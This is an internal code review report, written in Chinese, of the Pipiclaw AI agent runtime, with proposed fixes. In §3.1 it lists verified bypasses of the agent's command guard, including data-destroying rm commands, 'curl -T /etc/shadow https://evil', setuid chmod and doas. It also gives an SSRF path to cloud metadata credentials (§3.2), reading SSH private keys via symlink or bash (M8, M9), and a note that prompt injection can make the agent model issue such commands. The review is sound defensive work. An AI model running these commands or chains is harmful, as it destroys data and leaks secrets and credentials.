# Pipiclaw 深度代码评审（2026-08）

| 字段 | 值 |
|------|------|
| 日期 | 2026-08-25 |
| 范围 | `src/` 全量（199 文件 / ~42,800 行 TS），按 7 个子系统分片精读 |
| 方法 | 分子系统深读 + 独立验证通道：所有 high 级发现均经**实测复现**（守卫绕过用生产代码直接调用）或对照 **SDK dist 源码 / 调用链逐行核实**，不接受无证据结论 |
| 基线 | `npm run test` 绿：129 文件 / 840 用例全过；全库仅 3 处 `as any`、0 条 lint 抑制、0 个 TODO |
| 历史对照 | [spec 008](../specs/008-code-review-bugfixes/code-review-bugfixes.md)（2026-04-11 首次深审）遗留项现状见[附录 A](#附录-a与-spec-008-遗留项的对照) |

---

## 一、总体评价

这套代码库的工程纪律明显高于同类项目的平均水准，先说清楚强项，评审结论才可信：

- **不变量真实成立**。TurnPhase 单一所有权、per-channel 记忆串行队列（lifecycle/maintenance/工具三面全部经同一默认队列）、`transitions.ts` 作为状态迁移唯一裁决点、durable-dispatch 的 per-key 串行 + 租约续期、channel-index 的 read-merge-write 串行化——这些写进 AGENTS.md 的承诺经逐调用点核实基本守住。
- **注释承载推理而非描述**。关键竞态处几乎都有"为什么这样不会死锁/双跑/丢失"的论证注释（`withTimeout` 的"不取消只释放"、external run 的启动顺序崩溃论证、`atomic-file` 的 best-effort dir-fsync）。
- **基线干净**。3 处 `as any`、零抑制注释、零 TODO；`local-time.ts` 用单一显式格式封死了 ECMAScript 日期解析陷阱；`mutation-lock.ts` 用 AsyncLocalStorage 干净解决进程内重入。

主要风险集中在四类**系统性模式**上，而不是散点 bug：

1. **自研安全解析器的天花板**：command-guard 用几百行手写状态机逼近真实 shell 语义，实测存在一簇绕过（§3.1）；path-guard 的敏感路径模型在 bash/grep/skill_manage 三个面上可穿透（§4.2）。守卫之间不对称，最薄弱的一层决定实际边界。
2. **"看局部、写全局"的 AI 管线**：memory cleanup 把截断后的文件喂给模型再整体重写（§3.3）；executor 静默 10MB 截断叠加 edit 的读-改-写回造成大文件静默截断（§3.8）。这类路径在小数据下是清理工具，在大数据下变成删除通道。
3. **组合缝上的时序缺口**：单看每个组件都有测试锁定且正确，但组件拼合处——启动迁移 fire-and-forget（§3.7）、durable 重投无毒丸上限（§3.6）、events watcher 并发重入覆盖句柄、`isChannelActive` 快照过期——缺少端到端的时序防护。
4. **规范靠约定而非共享出口**：命令回复六规范、原子写纪律、时间词汇表都出现了"样板文件合规、边缘文件漂移"的形态（§5），说明约束目前存在于 code review 记忆里，还没有沉淀为 API 形状。

---

## 二、发现统计

| 严重度 | 数量 | 说明 |
|--------|------|------|
| High | 9 | 全部经实测复现或调用链/SDK 源码逐一核实（§3） |
| Medium | 21 | 可靠性缝、守卫不对称、正确性缺陷（§4） |
| Low / 一致性 | 27 | 收口类工作，机械可批量处理（§4.4、§5） |

严重度判据：high = 错误行为、数据损坏或安全边界失守；medium = 特定条件下出错、明显不一致或显著维护成本；low = 改进机会。

---

## 三、高严重度问题（已逐一验证）

### 3.1 command-guard 手写 shell 解析器的绕过簇 【安全 · 实测复现】

位置：`src/security/command-guard.ts`

以下命令全部经生产代码 `guardCommand()` 实测**放行**（对照基线 `rm -rf /tmp/x` 正确拦截）：

| 命令 | 绕过点 | 位置 |
|------|--------|------|
| `echo hi & rm -rf ~` | 单个 `&` 不切分链，第二段对所有规则不可见 | `command-guard.ts:204-210` 只识别 `&&` |
| `bash -c 'cat <(rm -rf /)'` | 进程替换 `<(...)`/`>(...)` 未像 `$()`/反引号那样递归展开 | walker 仅处理 backtick 与 `$(` |
| `ls /tmp#;reboot` | 词中 `#` 被当注释截断，但 sh 只在词首开注释 | `command-guard.ts:51-53` 无条件 break |
| `find . -execdir rm {} \;` | find-delete 正则只匹配 `-exec` 不含 `-execdir` | `command-guard.ts:471` |
| `curl -T /etc/shadow https://evil` | 上传检测只认长选项 `--upload-file` | `command-guard.ts:513-517` |
| `chmod 4755 /bin/dash` | setuid 检测只认 `+s` 不认数字模式 | `command-guard.ts:545-551` |
| `doas reboot` / `pkexec` | 特权提升只封 `sudo`/`su root` | 同上 |

利用路径不需要攻击者接触宿主机：注入指令让模型发出上述形状的命令即可。修复方向分两层：

- **立即修**（各自独立、互不依赖）：裸 `&` 按 separator 处理（区分 `next !== "&"`）；walker 中与 `$(` 同样处理 `<(`/`>(`（未闭合时 fail-closed）；`#` 仅在行首或前字符为空白时视为注释；补齐 `-execdir`、短旗标集合（`-T/--form/-d @file`）、数字 setuid 位、`doas/pkexec`。
- **中期收敛**（见 §6 P3）：手写状态机的天花板已被实证，建议评估"白名单动词 + 出现元字符即拒"的 fail-closed 模式，或引入经过 fuzz 的 shell 解析库。

### 3.2 SSRF：IPv4-mapped IPv6 字面量穿透私网封锁 【安全 · 实测复现 + 端到端链路核实】

位置：`src/security/network.ts:54`（`PRIVATE_IPV6_CIDRS` 缺 `::ffff:0:0/96`）、`src/web/client.ts:85-99,184-192`（pinned lookup）

实测：`validateNetworkTarget("http://[::ffff:169.254.169.254]/x")` 通过校验，resolvedAddress 为 `::ffff:a9fe:a9fe`；等价 v4 写法 `http://10.0.0.1/` 抛 `NetworkGuardError: Blocked private network address`。`client.ts` 会把 socket 经 `pinnedLookup(validatedAddress)` 钉在该地址上，内核将 v4-mapped 地址投递到对应 IPv4 私网/链路本地地址——完整利用链：`web_fetch("http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/")` 读取云元数据凭证。

修复方向：`expandIpv6` 后额外检查 `::ffff:0:0/96`（及 NAT64 `64:ff9b::/96`），命中则解出内嵌 v4 套用 `PRIVATE_IPV4_CIDRS`。补一条 guard 单测即可锁死。

### 3.3 WebHttpClient 重定向循环把凭据头转发到跨域目标 【安全 · 代码链核实】

位置：`src/web/client.ts:196-204`（循环体每跳重建同一组 headers，含 `...options.headers`）

301/302/307 跳转时 `Authorization: Bearer <jina key>`（`fetch.ts:59`）、Brave 的 `X-Subscription-Token`、Tavily 的 Authorization 原样发往重定向目标；`validateRedirectTarget` 只挡 SSRF 不感知头部敏感性。任何被抓取页面 302 到外部域名即泄漏 API key。修复方向：跨 origin（协议+主机变化）hop 时剥离 `Authorization`/`Cookie`/`X-Subscription-Token` 类敏感头。

### 3.4 memory cleanup 输入截断导致 MEMORY.md 中段条目被静默永久删除 【数据丢失 · 代码链核实】

位置：`src/memory/consolidation.ts:377`（输入 clipText head50%+tail50%，上限 24k）、`:399-401`（模型输出整体重写）、`:30,37`（触发阈值 5k）

MEMORY.md 增长超过 24,000 字符后，cleanup 把中段条目对模型隐藏，再用模型输出**整体重写文件**。中段内容从未被展示，其消失与正常清理无法区分：`validateCleanupSchema` 只查 invented/duplicate id 与 user 条目保留；`isCleanupResultTooSmall` 只在丢失超一半时拒绝。活跃频道每次 structural pass 都会再削掉一批中龄条目，且 `droppedEntryIds` 被记为"有意丢弃"。无测试覆盖该区间。修复方向：输入超限时改为按条目粒度选取（同 `renderSimilarMemoryEntriesForPrompt` 的做法），或输出含未展示 id 时直接拒绝本次 cleanup。

### 3.5 孤儿任务事件的 taskId 解析与领域层规范不一致，会误删存活事件 【调度数据损失 · 代码链核实】

位置：`src/runtime/events.ts:664-666` 对照 canonical 解析器 `src/tasks/task-events.ts:10-18`

```ts
const taskId = name.slice(prefix.length).split(".")[0];   // events.ts：按第一个点切
const lastDot = rest.lastIndexOf(".");                    // task-events.ts：按最后一个点切
```

任务 id 由模型经 `task_manage create` 自由指定，`TASK_ID_PATTERN = /^[A-Za-z0-9._-]+$/`（`ledger.ts:73`）允许含点。对 id 含点的任务，孤儿判定去检查错误路径上的 `tasks/<id首段>.md`：不存在即返回 "owning task no longer exists"，随后 `execute()` 里 `cancelScheduled` + `deleteFile` **把仍被原任务拥有的周期事件在第一次触发时就静默销毁**。修复方向：改用 `parseTaskEventName(name, event.channelId)` 取 id，删除手写切片；补一条含点 id 的回归测试。

### 3.6 structured wake 的持久重试没有毒丸上限 【可靠性 · 代码链核实】

位置：`src/runtime/bootstrap.ts:819-821`（finally 中 `markRetryable`）、`src/runtime/durable-dispatch.ts:195-205,239-249`（重投无上限、无退避）

job/subagent 完成唤醒若在 claim 与 finish 之间持续失败（磁盘满、权限问题），`structuredWakeFinalized` 保持 false → 每 30s drain 重投 → 再跑一轮完整 agent turn → 再失败……无限循环烧 token 并反复占用 channel 队列。task-driver wake 有 futile-wake governor 约束，唯独这条路径既无 governor 也无最大尝试数；`deliveries` 字段只用于给事件文本加 `[REDELIVERY:n]` 注记。修复方向：加最大投递次数（超限挂起并通知用户）或连续失败指数退避。

### 3.7 启动迁移未 await 就启动 taskDriver/eventsWatcher 【升级可靠性 · 代码链核实】

位置：`src/runtime/bootstrap.ts:1069-1077`

```ts
void Promise.all([migrateLegacyTaskScheduleEvents(...), migrateLegacyTaskState(...)]);
eventsWatcher.start(); ... taskDriver.start();
```

注释声称迁移 fold 发生在 "before the driver relies on the current contract alone"，实际是 fire-and-forget。而 legacy status 读取侧 fail-open（`normalizeStoredStatus` 把 `done/paused/awaiting-user` 归一成 `"active"`；v3 control 缺失时 fail-open 为 actionable）：携带 legacy 任务文件的首次升级启动上，driver 前几个 tick 会把本应被归档/停用的死任务当作活跃任务派发真实 LLM 唤醒；eventsWatcher 也可能在遗留 `.schedule` 事件被删除前触发它最后一次 cron。这与同函数上方对 `restoreChannelJobs`/`restoreAllSubAgentRuns`/turn-recovery 一律 await 后才开放 admission 的纪律自相矛盾。修复方向：把两个迁移纳入启动 await 链（服务 start 之前）。

### 3.8 executor 静默 10MB 截断 × edit 读-改-写回 = 大文件静默截断 【数据丢失 · 代码链核实】

位置：`src/executor.ts:128-135`（cap-and-discard，无任何标注）、`src/tools/edit.ts:187-192,245-254`（`cat` 读全文无大小预检）

edit 对 >10MB 文件：`oldText` 若落在前 10MB 内则替换成功，并发 recheck 读到的也是同样被截断的前缀（相等→通过），随后 `writeContent` 把截断内容整体写回——10MB 之后的数据永久丢失且无报错。同根问题还有两个表现：grep 的忽略目录过滤发生在 10MB 截断之后（大仓库里 node_modules 先填满缓冲，过滤后返回自信的 "No matches"，`src/tools/grep.ts:222-255`）；逐 chunk `data.toString()` 在 UTF-8 多字节边界产出 U+FFFD，纯中文命令输出几乎每个 64KB 边界损坏一次（`executor.ts:128-131`，对钉钉优先场景是高频可感知 bug）。修复方向：edit 读前用 `wc -c` 预检拒绝超限；executor 截断改为显式失败或在结果中强制标注；stdout/stderr 改用 string_decoder 或累积 Buffer 到 close 一次性解码。

### 3.9 `/steer` 大消息会中止正在运行的回合 【正确性 · SDK dist 源码核实】

位置：`src/agent/channel-runner.ts:1123 → :1306-1330 → session.compact()`

busy 路径的 steer 在排队前调 `maybeRunPreventiveCompactionForIncomingText(queuedMessage)`；投影 token ≥75% 窗口时执行 `session.compact()`。SDK 源码（`pi-coding-agent/dist/core/agent-session.js:1362-1371`）明确写着 *"Aborts current agent operation first"* 并执行 `_disconnectFromAgent(); await this.abort()`——预防性压缩把正在流式执行的回合直接杀掉，steer 文本随后因 busy 窗口校验失败被 requeue 成新回合。长回合 + 近阈值上下文 + 较长的 steer 文本即可触发。测试只覆盖了纯函数决策，未覆盖此路径。修复方向：steer 路径仅在 `!session.isStreaming` 时执行预防性压缩，或干脆跳过（steer 本身不增加持久上下文压力）。

---

## 四、中严重度问题

### 4.1 runtime 可靠性缝

| # | 问题 | 位置 | 要点 |
|---|------|------|------|
| M1 | `/stop` 的 `cancelChannel` 与被停回合自身的 `markCompleted/markRetryable` 竞态 | `bootstrap.ts:356-366,819-821` | stop 后"next tick 重投"落空（文本唤醒彻底丢失），或 drain tick 恰在中间时产生重复唤醒且记录被来回翻转。修复：终止标记携带回合身份，finally 跳过已被显式放弃的 dispatchId |
| M2 | events watcher 路径上 async `handleFile` 无 catch | `events.ts:419-422` | watch 触发的两条路径裸调 async 函数；一次性事件的"过期恢复"分支在 try/catch 之外 `await execute()`，畸形内容/磁盘故障会成为 unhandled rejection 使 daemon 整体退出（Node ≥15 默认 crash）。修复：`.catch(log.logWarning)` |
| M3 | 同名事件文件并发重入时旧 timer/cron 泄漏 | `events.ts:607,638,413-424` | `cancelScheduled` 只在进入 handleFile 前；两次相隔 >100ms 的 watch 事件让两个 handler 并发跑完，后者 `timers/crons.set` 覆盖前者句柄：一次性事件双侧执行（preAction 跑两遍），孤儿 cron 每 tick 触发直到重启。修复：handleFile 入口先 cancel + 代际计数丢弃过期结果 |
| M4 | `isChannelActive` 在 gate 判定前是过期快照 | `scheduler.ts:222-240` → `maintenance-jobs.ts` 三处消费 | 取值发生在 `getRuntimeContext` 与入队之前；用户恰在 tick 后发消息时后台会在活跃 turn 期间做 LLM 维护（session-refresh 基于半截 turn 重写 SESSION.md）。修复：传 thunk，在队列内 gate 判定那一刻求值 |
| M5 | 后台 job 以裸 PID 探活/kill | `job-manager.ts:387-389,508-512` | nohup 设计跨 daemon 重启存活，宿主机 PID 复用后：死 job 显示 ALIVE 占住 slot；cancel/timeout 会对复用者 `kill -9`。启动命令含唯一 `pipiclaw-job-<id>` spill 路径，kill 前校验 `/proc/<pid>/cmdline` 即闭合 |
| M6 | `MAX_RUNNING_JOBS` 是 check-then-act | `job-manager.ts:282-286,300,319` | 检查后要经过 `await executor.exec(launch)` 才注册记录；SDK 默认并行执行异步工具，两条并发调用即可突破到 6 个运行 job。修复：start 入口同步预留 slot，失败回滚 |
| M7 | 状态报告型命令抛错时用户完全静默 | `bootstrap.ts:673-706,814-818` | `/tasks` `/status` `/usage` `/subagents` `/project` 抛错只 rethrow 后被外层吞掉；runner 内建命令却有"命令执行失败"回复。同类命令两种可见性。修复：catch 里补一行 sendPlain 失败回复 |

### 4.2 守卫不对称（security/tools）

| # | 问题 | 位置 | 要点 |
|---|------|------|------|
| M8 | `skill_manage` 完全不走 path-guard，skills/ 内 symlink 可逃逸 | `skill-manage.ts:246-261`、`skill-security.ts:96-112` | `bash ln -s ~/.ssh/id_rsa skills/foo/assets/k` 放行后，`skill_manage view` 直接读出私钥全文；同一目标 read 工具会被 sensitive-read/symlink 解析拦截。修复：view/patch/write 前对 realpath 跑 `guardPath` 并拒 symlink |
| M9 | bash 工具对 path-guard 视而不见 | `bash.ts:171-188` 仅过 command-guard | `bash cat ~/.ssh/id_rsa` 畅通，而 read/grep/send-media 为同一批路径建了敏感清单。fs 工具上那层保护对最终执行面只是装饰。若属已知取舍应在 AGENTS.md 显式记档，否则让 command-guard 对 atom 中路径 token 复用 `matchesSensitiveReadPath` 兜底 |
| M10 | rtk 重写结果直接执行不再回炉 guard | `command-optimizer.ts:63-76`、`bash.ts:202,216` | guard 审的是原始串，实际执行的可能是第三方二进制产出的另一串。修复：对 `effectiveCommand` 再跑一次 `guardCommand` |
| M11 | grep 无逐文件敏感检查 | `grep.ts:222-255` | root 过了 guard 后命中文件内容原样回传，名为 `id_rsa*` 的密钥文件 grep 直接打印而 read 会拒。修复：输出行级过滤或在 footer 披露 |

### 4.3 agent/subagents 正确性

| # | 问题 | 位置 | 要点 |
|---|------|------|------|
| M12 | fallback 手术只改内存 transcript，持久 branch 仍留失败的 `[user, assistant(error)]` | `model-fallback.ts:66-76`、`channel-runner.ts:550-553` | SessionManager append-only JSONL 无回滚对称操作；重启后重放重复用户消息并送进记忆抽取。修复：切换后向 sessionManager 追加补偿标记或同步截断 |
| M13 | internal run 注册与挂 cancel handle 之间的窗口内取消被误判 lost 并提前释放 write 租约 | `runs.ts:774-784`、`tool.ts:988-1074` | 窗口内（verify 场景遍历工作树可达秒级）`/subagents cancel` 命中 "unreachable" 分支：run 标 lost、租约释放，子代理仍真实写入。external 有占位 handle 封闭同类窗口，internal 没有 |
| M14 | restore() 租约重建失败后 adopted write run 在无互斥状态下继续运行 | `runs.ts:866-878` | 两个重叠目录 write run 同时被采纳时后者只记 warning 并清空自己的 leaseKey，D10.1 写互斥重启后静默降级为零互斥。修复：重建失败视为不可继续，settle 为 lost/cancelled |
| M15 | 崩溃后 half-settled run 的用量永久漏记 | `runs.ts:588-604,885-895` | required persist 与 usage persist 之间崩溃：重启后记录已是 terminal+settledAt，`usageRecorded` 无任何重放路径。修复需配 ledger 侧按 runId 去重使补记幂等（盲重放会双计） |
| M16 | spawn ENOENT 把「cwd 不存在」误报成「CLI 未安装」 | `external/run.ts:159-162`、`subagent-manage.ts:371` | follow_up 不复查 workingDirectory 存在性，错误指引指向错误方向。修复：spawn 前探测 cwd，或按 errno 区分 chdir/exec 失败 |

### 4.4 web / 一致性

| # | 问题 | 位置 | 要点 |
|---|------|------|------|
| M17 | Readability 失败的 fallback 把 `<script>`/`<style>` 内容当正文喂给模型 | `extract.ts:111-119` | 首页/短页/反爬页很常见；JS/CSS 以 text/markdown 进入上下文浪费 prompt 预算。修复：解析前移除 script/style/noscript/template |
| M18 | `/events show`、`history` 无长度上限；历史文件不轮转全量载入 | `event-commands.ts:135-141,194-210`、`events.ts:266-270` | 违反回复规范长度预算；appender 缺 `maxSizeBytes` 无界增长 |
| M19 | 领域层英文错误透传 + pause/run/resume 包装方式漂移 | `task-commands.ts:285-303,362-366` | "Task x is sleeping..." 纯英文直进聊天；resume 不捕获走另一种形态，且校验顺序与 pause 相反 |
| M20 | 空状态与措辞在三套命令间漂移 | `event-commands.ts:103,108`、`subagent-commands.ts:140,151,157,178` | 「没有找到…」「没有委派记录。」vs 合规样板「暂无 X。」+如何开始；规则 6 确立后的回退面。抽 `emptyState(label, hint)` 助手统一 |
| M21 | bot 回复归档的同毫秒去重丢行 | `store.ts:123-131`、`delivery.ts:133-137` | dedupe key 只有 channelId+ts；流式进度多条同毫秒归档时第二条静默丢弃，session_search 冷存储缺段。修复：key 加内容哈希或仅入站消息保留 ts 去重 |

---

## 五、横切面主题（系统性收口）

这些不是单个 bug，而是同一模式在多处出现的重复税。每一项都可以作为一次机械的 sweep 一次性完成。

1. **原子写纪律的例外面**。18 处状态文件走 `writeFileAtomically`，例外是：`settings.json`（`settings.ts:346`——全库最关键的配置文件反而裸写，崩溃窗口内截断后下次启动静默回退默认设置）、`.channel-meta.json`（`dingtalk.ts:1517`，每条入站消息都写）、memory 初始 scaffold（`files.ts:418-424`）、event marker（`events.ts:859`）。前三者都应换 `writeFileAtomically`。
2. **小助手函数的多套平行实现**。`clipText` ×3（100/160/shared 版本，阈值与省略号已漂移）、`formatDuration` ×2（字节级相同）、`isRecord` ×2 且**语义相反**（shared 版放行数组，control.ts 版排除）、`hasMeaningfulMessages` ×2（判定条件不同，对手工对话给出相反结论）、`computeRecencyBoost` ×2（同名不同值）、`formatPathBlockMessage` ×5（措辞开始分叉）、路径 confinement 手写两套。收口方式：各保留一个权威实现放 shared/领域层，其余改导入。
3. **时间词汇双轨**。`local-time.ts` 宪章明文规定存储值不经 `new Date(string)` 解析、不用 UTC Z 串，但 `eligibleAfter` 写入用 `toISOString()`（`channel-runner.ts:1040-1043`）、usage 月度分桶用 UTC 月选文件名（`ledger.ts:73-75`，完整性靠两端同钟的巧合维持）、recall/files/maintenance-state 用裸 `Date.parse`。统一走 `formatLocalTime/parseLocalTime`，或在偏离处注明理由。
4. **命令渲染规范靠约定**。`/context` 报告用 `#` 标题、全英文、无长度上限（`prompt/manifest.ts:160`）；空参数 `/steer` 空闲路径返回英文报错且缺下一步（`channel-runner.ts:1055-1061`），busy 路径却是合规中文；`logUsageSummary` 构造的 markdown 无人消费且唯一调用点丢弃返回值（`log.ts:269`、`channel-runner.ts:741`）；`/subagents cancel` 拼原始英文 status 而 list/show 已有中文映射。建议把六规范沉淀为一个共享 reply-renderer 出口（headline/bullets/emptyState/capReply 四个原语），让合规成为默认而不是自觉。
5. **SDK 边界耦合缺防御层**。除 §3.9 的 compact-abort 外：fallback 对 SessionManager append-only 特性缺乏回滚对称性（M12）；`login-ui.ts:135-141` 依赖 readline 私有 API `_writeToOutput`，Node 升级改名时 API key 会在真 TTY 上明文回显且无告警。另外 SDK 被 20+ 文件直接 import，建议至少建一份「SDK 行为契约备忘」（compact 中止语义、SessionManager append-only、toolExecution 默认 parallel 等），把这些已踩到的坑写成显式知识。
6. **大文件的拆分边界已经清晰**。`tasks/ledger.ts`（1188 行）混装 frontmatter 解析 / Plan 补丁 / DoD 统计 / 周期折叠 / 读缓存五个职责，store/transitions/control 已各自成文，拆分为 task-frontmatter / task-plan / task-body-edits / ledger-reader 四模块有天然接缝；`channel-runner.ts`（1681 行）的构造/session 装配（约 400 行）与 turn 流水线是清晰可拆的两块；`tool.ts` 的 `createDetails` 十个位置参数应改对象参数。claude-code/codex-cli 两个 harness 的 NDJSON 解析骨架逐行重复，应抽 `walkNdjson(eventsText, onEvent)`。
7. **类型严格度缺口**。tsconfig 未开 `noUncheckedIndexedAccess`——对一个大量 Map/数组索引的代码库这是最有价值的一条严检旗标；可顺带开启 `noImplicitOverride`、`noFallthroughCasesInSwitch`。预期会暴露一批需要显式判空的点，建议独立 PR 渐进落地。`useDefineForClassFields: false` 若非刻意兼容 SDK 应复核。
8. **杂项低危**：AI Card 的 `failed` 通路是无调用方死代码（`dingtalk.ts:835-897`）；`RunState.store` 死管道；bash 同步路径 spill 文件永不清理（`/tmp` 无限累积，对比 job-manager 有回收）；api-keys.ts 错误提示硬编码 `~/.pipiclaw` 误导 `PIPICLAW_HOME` 用户；`src/index.ts` 导出面超出文档宣称的最小集合（每项都是 knip 盲区）；DuckDuckGo 结果不解包 `uddg=` 包装链接；无代理路径每次请求 new keepAlive Agent 永不 destroy；注释引用不存在的 `sweep()`（`runs.ts:543,914` 等 4 处，指向错误机制误导导航）。

---

## 六、优化路线图

原则：先堵住会造成不可逆损失的口子，再收口一致性债务；每一步都以绿色基线为前提，修一项补一项对应测试。

### P0 —— 安全与数据丢失（建议本周）

| 项 | 内容 | 对应验证 |
|----|------|----------|
| 1 | network guard 补 `::ffff:0:0/96` + NAT64 检查（§3.2） | guard 单测：mapped/NAT64/direct v4 三态 |
| 2 | client.ts 跨 origin hop 剥离凭据头（§3.3） | redirect 测试：带 Authorization 的 302 |
| 3 | command-guard 七项字面修复（§3.1 立即修层） | 把本报告七条实测命令固化为测试用例 |
| 4 | skill_manage view/patch/write 过 guardPath + 拒 symlink（M8） | symlink 逃逸回归测试 |
| 5 | rtk 重写结果二次 guard（M10） | 重写产物含 deny 模式的测试 |
| 6 | memory cleanup 拒绝重写含未展示 id 的输出（§3.4） | >24k MEMORY.md 的 cleanup 测试 |
| 7 | events 孤儿判定改用 `parseTaskEventName`（§3.5） | 含点任务 id 的回归测试 |
| 8 | edit 读前大小预检 + executor 显式截断标注 + string_decoder（§3.8） | 大文件 edit 拒绝测试；多字节边界解码测试 |

### P1 —— 可靠性缝（两周内）

1. 启动迁移纳入 await 链（§3.7）；durable dispatch 加毒丸上限/退避（§3.6）
2. steer 路径禁用预防性压缩（§3.9）；fallback 的 SessionManager 回滚对称性（M12）
3. events watcher：handleFile 加 catch（M2）+ 重入代际防护（M3）
4. scheduler 的 `isChannelActive` 改 thunk（M4）；job-manager PID 校验（M5）+ slot 预留（M6）
5. subagents：internal 取消占位 handle（M13）+ 租约重建失败即终止（M14）+ usage 幂等补记（M15）
6. `/stop` 组合竞态（M1）、命令错误静默（M7）、同毫秒归档去重（M21）

### P2 —— 一致性收口（一个月内，均可机械化）

1. atomic-file 例外面清理（§5.1）；小助手函数归一（§5.2）；时间词汇统一（§5.3）
2. 共享 reply-renderer 出口，迁移全部命令家族（§5.4）；`/context`、空态、英文透传一并解决
3. web extract 的 script/style 剥离（M17）、DDG 直链还原、Agent destroy
4. spawn 错误分类（M16）、codex 多 turn 用量累加、`/events show/history` 长度上限（M18/M19/M20）

### P3 —— 结构性投资（择机）

1. command-guard 的长期路线决策：fail-closed 白名单 vs fuzz 过的解析库（§3.1 中期层）——建议先做一个 spike 评估迁移成本
2. bash 是否接入 path-guard 的产品决策（M9），结论写入 AGENTS.md
3. ledger.ts / channel-runner.ts 按既有接缝拆模块；harness NDJSON 骨架抽取；createDetails 对象参数化
4. tsconfig 开启 `noUncheckedIndexedAccess` 等严检旗标（独立 PR）
5. SDK 行为契约备忘录（compact/SessionManager/toolExecution/readline 私有 API），沉淀为新接手者的显式知识

---

## 附录 A：与 spec 008 遗留项的对照

| spec 008 编号 | 当时状态 | 现状（2026-08） |
|---------------|----------|------------------|
| S1 Jina 网络守卫绕过 | 🔲 待处理 | ✅ 已消解：Jina fallback 现经 `createWebHttpClient`（带 securityConfig）走统一守卫客户端 |
| R1 shutdown 顺序 | ⏭️ 跳过（定性 Medium-High） | 未复发相关症状，维持观察 |
| P1 memory append O(n) I/O | 🔲 待处理 | ✅ 已消解：历史追加改用 `appendFile` 流式写入 |
| Q3 SDK 私有字段耦合 | 🔲 待处理 | ⚠️ 形态存续并有新实例（§3.9 compact、M12 SessionManager、readline 私有 API），见 §5.5 |
| T1 测试覆盖缺口 | 部分 | 本轮发现的多数 high 都落在"纯函数有测、组合路径无测"的缝隙里（§3.5/3.9/M2/M3），组合时序测试仍是最大欠账 |

## 附录 B：评审方法备注

- 7 个子系统分片并行深读（runtime 核心 / runtime 命令与事件 / memory / subagents / tools+security / tasks·web·models·shared·tui / agent 编排），每片要求逐文件精读、给出 file:line 证据、禁止无证据猜测；
- 汇总阶段对全部 high 级发现做了独立验证：安全绕过以生产代码直接调用复现（非阅读推断），涉及 SDK 语义的对照 `node_modules/@earendil-works/pi-coding-agent/dist` 源码确认；
- 中/低级发现抽查核实（如 settings 裸写、events 裸 promise、check-then-act 窗口均经二次确认）；个别依赖特定运行时状态的发现（如 M1 的 drain tick 时序、M21 的同毫秒归档）按代码链逻辑认定，置信度略低于实测项；
- 已核对可疑行为是否被现有测试断言为预期：M2/M3/M6/§3.5/§3.9 均无既有断言覆盖，不算"已声明的设计取舍"；仅 dingtalk 先 ACK 的消息丢失窗口（runtime 评审 low #8）在测试中有明确断言，故未列入正文。
